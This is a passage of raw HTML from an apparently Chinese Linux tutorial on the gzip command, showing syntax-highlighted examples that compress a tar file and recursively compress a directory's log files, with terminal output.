					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b75785086719-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b75785086719-1&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;gzip&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.tar&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0005 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c9a9b79649494346&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test]# ls -al log.tar

-rw-r--r-- 1 root root 307200 11-29 17:54 log.tar

[root@localhost test]# gzip -r log.tar

[root@localhost test]# ls -al log.tar.gz 

-rw-r--r-- 1 root root 1421 11-29 17:54 log.tar.gz&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b79649494346-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b79649494346-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b79649494346-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b79649494346-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b79649494346-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b79649494346-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b79649494346-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b79649494346-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b79649494346-9&quot;&gt;9&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b79649494346-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ls -al log.tar&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b79649494346-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b79649494346-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;307200&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;29&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;54&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.tar&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b79649494346-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b79649494346-5&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# gzip -r log.tar&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b79649494346-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b79649494346-7&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ls -al log.tar.gz &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b79649494346-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b79649494346-9&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1421&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;29&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;54&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.tar&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0018 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;实例5：递归的压缩目录&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c9a9b7c235973756&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
gzip -rv test6&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7c235973756-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7c235973756-1&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;gzip&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0004 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c9a9b7f333559004&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test6]# ll

总计 604

---xr--r-- 1 root mail  302108 11-30 08:39 linklog.log

---xr--r-- 1 mail users 302108 11-30 08:39 log2012.log

-rw-r--r-- 1 mail users     61 11-30 08:39 log2013.log

-rw-r--r-- 1 root mail       0 11-30 08:39 log2014.log

-rw-r--r-- 1 root mail       0 11-30 08:39 log2015.log

-rw-r--r-- 1 root mail       0 11-30 08:39 log2016.log

-rw-r--r-- 1 root mail       0 11-30 08:39 log2017.log

[root@localhost test6]# cd ..

[root@localhost test]# gzip -rv test6

test6/log2014.log:        0.0% -- replaced with test6/log2014.log.gz

test6/linklog.log:       99.6% -- replaced with test6/linklog.log.gz

test6/log2015.log:        0.0% -- replaced with test6/log2015.log.gz

test6/log2013.log:       47.5% -- replaced with test6/log2013.log.gz

test6/log2012.log:       99.6% -- replaced with test6/log2012.log.gz

test6/log2017.log:        0.0% -- replaced with test6/log2017.log.gz

test6/log2016.log:        0.0% -- replaced with test6/log2016.log.gz

[root@localhost test]# cd test6

[root@localhost test6]# ll

总计 28

---xr--r-- 1 root mail  1341 11-30 08:39 linklog.log.gz

---xr--r-- 1 mail users 1341 11-30 08:39 log2012.log.gz

-rw-r--r-- 1 mail users   70 11-30 08:39 log2013.log.gz

-rw-r--r-- 1 root mail    32 11-30 08:39 log2014.log.gz

-rw-r--r-- 1 root mail    32 11-30 08:39 log2015.log.gz

-rw-r--r-- 1 root mail    32 11-30 08:39 log2016.log.gz

-rw-r--r-- 1 root mail    32 11-30 08:39 log2017.log.gz&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-39&quot;&gt;39&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-40&quot;&gt;40&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-41&quot;&gt;41&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-42&quot;&gt;42&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-43&quot;&gt;43&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-44&quot;&gt;44&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-45&quot;&gt;45&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-46&quot;&gt;46&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-47&quot;&gt;47&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-48&quot;&gt;48&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-49&quot;&gt;49&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-50&quot;&gt;50&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-51&quot;&gt;51&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-52&quot;&gt;52&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-53&quot;&gt;53&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-54&quot;&gt;54&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b7f333559004-55&quot;&gt;55&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-3&quot;&gt;总计 &lt;span class=&quot;crayon-cn&quot;&gt;604&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b7f333559004-5&quot;&gt;
